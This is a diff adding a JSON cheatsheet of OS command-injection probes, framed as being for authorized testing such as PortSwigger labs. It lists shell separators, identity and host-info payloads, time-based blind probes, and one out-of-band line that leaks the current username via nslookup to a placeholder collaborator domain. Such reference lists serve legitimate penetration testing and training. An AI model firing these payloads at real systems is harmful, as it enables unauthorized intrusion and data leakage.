@@ -1,0 +1,24 @@
+{
+  "app": "QuickNote",
+  "type": "cheatsheet",
+  "name": "Command Injection",
+  "version": 1,
+  "description": "OS command-injection probes for authorized testing (PortSwigger labs, your own environments).",
+  "snippets": [
+    { "category": "Separators", "label": "Chain regardless of first result", "text": "; command" },
+    { "category": "Separators", "label": "Run if previous succeeds", "text": "&& command" },
+    { "category": "Separators", "label": "Background / separate (Windows too)", "text": "& command" },
+    { "category": "Separators", "label": "Pipe output", "text": "| command" },
+    { "category": "Separators", "label": "Inline substitution", "text": "`command`" },
+    { "category": "Separators", "label": "Substitution (modern)", "text": "$(command)" },
+
+    { "category": "Confirm", "label": "Identity", "text": "; whoami" },
+    { "category": "Confirm", "label": "Host info", "text": "; uname -a" },
+    { "category": "Confirm", "label": "Windows identity", "text": "& whoami" },
+
+    { "category": "Blind — time", "label": "Sleep (Linux)", "text": "; sleep 10" },
+    { "category": "Blind — time", "label": "Ping delay (Windows)", "text": "& ping -n 10 127.0.0.1" },
+
+    { "category": "Blind — out-of-band", "label": "DNS/HTTP callback (Linux)", "text": "; nslookup $(whoami).YOUR-COLLAB-DOMAIN" }
+  ]
+}
